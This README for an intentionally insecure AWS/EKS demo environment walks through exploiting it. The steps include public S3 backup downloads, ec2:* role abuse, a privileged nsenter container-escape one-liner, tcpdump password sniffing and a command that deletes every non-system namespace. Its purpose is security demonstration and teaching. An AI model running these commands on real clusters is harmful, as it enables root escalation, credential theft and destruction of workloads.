# aws
This repo will build all required AWS Networking and resources to run a 3 tiered MongoDB app.  This includes EC2, EKS, S3, Route53, and AWS Config.  There are known insecure configurations in this repo.  The follow steps will highlight some of these and attempt to exploit them.

## Pre Reqs
- Setup shell with AWS credentials
- AWS Key Pair
- Terraform 1.3.7+
- aws cli
- kubectl
- helm
- curl
- jq

## Provision AWS Infrastructure
```
cd infra/ec2
```
Update the `my.auto.tfvars` for your environment.  Configure your existing AWS Key Pair or copy a local SSH key to your region using this script `./scripts/push-aws-sshkey-multiregion.sh`. Review the prefix being used for resource names, the EKS version, private zone name for route53, and external  CIDR for SSH access. 

### Provision EC2
Use terraform to build the required AWS Infrastructure
```
terraform init
terraform apply -auto-approve
```
All AWS resources will be provisioned and configured to support the tasky application.



### Connect to EKS
Connect to EKS using `scripts/kubectl_connect_eks.sh`.  Pass this script the path to the terraform state file used to provision the EKS cluster.  If cwd is ./infra like above then this command would look like the following:
```
source ../../scripts/kubectl_connect_eks.sh .
kt get ingress
```
This script connects EKS and builds some useful aliases shown in the output.

### Get the Ingress URL
Use this URL to access the Tasky application.
```
make getIngress

Tasky URL - http://tasky-ingress-1379807902.us-west-2.elb.amazonaws.com
```
Login to verify Tasky is healthy and create tasks.  This mongodb will only accept internal requests from the VPC CIDR block.

## Mongo DB Backups to S3
Verify the backups are going to S3, they are public, and can be downloaded.  Start by going to the S3 URL in your browser.
```
terraform output bucket_url
```
You should see a list of .tar.gz files.  These are the DB backups happening every 5 minutes.  Copy one of the file names and update the URL with `/<filename>`.  This should download the exact file.

### Use the AWS Console to show the AWS Config - S3 Conformance pack violations
* S3BucketLoggingEnabled
* S3BucketSSLRequestsOnly
* S3BucketReplicationEnabled
* S3BucketPublicReadProhibited

### S3 Policy review
`./aws-tasky/modules/aws_ec2_iam_profile/iam-profile.tf`

### Mongo DB user-data script review
`./aws-tasky/modules/aws_ec2/temmplates/mongo.sh`

## Public EC2 Instance - Verify ext SSH and RBAC
MongoDB is hosted on an EC2 instance running in a public subnet.  Get the public IP of the EC2 instance and see if you can SSH to it.
```
IP=$(terraform output -json | jq -r '.usw2_ec2_ip.value."usw2-shared-ext-mongodb"')
```

### Verify SSH is exposed externally
```
ssh ubuntu@${IP}
```
This will use the AWS key that was defined in `my.auto.tfvars`

### Review EC2 Profile Role (ec2:*)
If an EC2 instance can assume this level of privilege it can easily provision new EC2 instances in any subnet, map it to any security group, and configure any SSH key pair.  Lets see how easy it is.

EC2 Discovery

Find a public subnet that is routable from the internet and a security group you want to apply to your shadow instance
```
aws ec2 describe-subnets --filters "Name=tag:Tier,Values=Public" | grep SubnetId
aws ec2 describe-security-group-rules --query 'SecurityGroupRules[].[Description, GroupId, ToPort, CidrIpv4]' --output table
```

EC2 key pair creation
```
ssh-keygen
aws ec2 create-key-pair --key-name pp-keypair-test
```

EC2 Instance Creation
```
aws ec2 run-instances \
  --image-id ami-07fe743f8d6d95a40 \
  --instance-type t2.micro \
  --subnet-id subnet-06f0cbd01b59f1b53 \
  --security-group-ids sg-01c640cca4b063fbd \
  --associate-public-ip-address \
  --key-name ppresto-ptfe-dev-key
```

Get the external IP to SSH to the new instance
```
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId, InstanceType, SubnetId, PublicIpAddress]' --output table
```
#### Recap
* Don't give ec2:* permissions
* ingress all is bad.  egress all opens you up to reverse shells too!
* Improvement area
Setup a VPC interface endpoint for com.amazonaws.region.s3. 
Access s3 through AWS privatelink instead of allowing all traffic outbound.
## Tasky Application - Verify RBAC

### Tasky image
Is the application running with cluster-admin privileges?
* Shell into the tasky app
* Review the Dockerfile
  * Chainguard - Lightweight, distroless, hardened images with SBOMs and signatures. NO shell, package mgr,  Less attack surface and chance of CVEs

### Tasky sidecar has cluster-admin
The tasky pod is running a sidecar container `network-multitool`.  To see if containers have 
cluster-admin privilages connect to the sidecar, install `kubectl`, and use it to **escape into the Working Node as root!**
```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod 755 kubectl
```

Escape into the Node as **root** with kubectl
```
./kubectl run r00t --restart=Never -ti --rm --image tasky --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
This one liner from Duffie Cooley spawns a new container named r00t based on alpine. The container is run in privileged mode ("privileged":true, so root gets all linux capabilities) "hostPID":true makes the container use the host's PID namespace (so the EKS Node) and the nsenter command is executing bin/bash with the context of another process (PID 1).

Look for interesting things (secrets, certs, package mgr)
```
mount | grep tmpfs
cat /var/lib/kubelet/pods/2694c56e-1064-4c42-b8e3-2d1b67f03112/volumes/kubernetes.io~secret/cert/ca.crt | openssl x509 -text -noout
yum
```

### Tasky sidecar has NET-ADMIN capability
This allows the container to read/write iptable rules, and sniff traffic with tcpdump.
```
tcpdump -i eth0 dst port 8080 -A | grep password
```

## Notes
Delete other namespaces to show you have cluster-admin privileges
```
./kubectl get ns --no-headers=true | sed "/kube-*/d" | sed "/default/d" | sed "/tasky/d" | awk '{print $1;}' | xargs ./kubectl delete ns
```

## References
* [OWASP Cheatsheets](https://cheatsheetseries.owasp.org/index.html)
* [OWASP Cheatsheets Repo](https://github.com/OWASP/CheatSheetSeries)
* [2023 OSS Security Report](https://go.snyk.io/state-of-open-source-security-report-2023-dwn-typ.html)
* [HackTricksCloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes)



NOTES

GCP Outpost
```
module "wiz" {
  source                           = "https://wizio-public.s3.amazonaws.com/deployment-v2/gcp/wiz-gcp-org-terraform-module.zip"
  org_id                           = "OrgID"
  worker_service_account_id        = "wiz-worker-sa@qwiklabs-gcp-02-47b1ef38a1b5.iam.gserviceaccount.com"
  wiz_managed_identity_external_id = "wize62693d906e52cd54369580c867@wiz-disk-analyzer-demo-eu1.iam.gserviceaccount.com"
  serverless_scanning              = true
  data_scanning                    = true
  forensic                         = true
}
```

GCP Standard
```
module "wiz" {
  source                           = "https://wizio-public.s3.amazonaws.com/deployment-v2/gcp/wiz-gcp-org-terraform-module.zip"
  org_id                           = "OrgID"
  wiz_managed_identity_external_id = "wize62693d906e52cd54369580c867@wiz-disk-analyzer-demo-eu1.iam.gserviceaccount.com"
  serverless_scanning              = true
  data_scanning                    = true
  forensic                         = true
}
```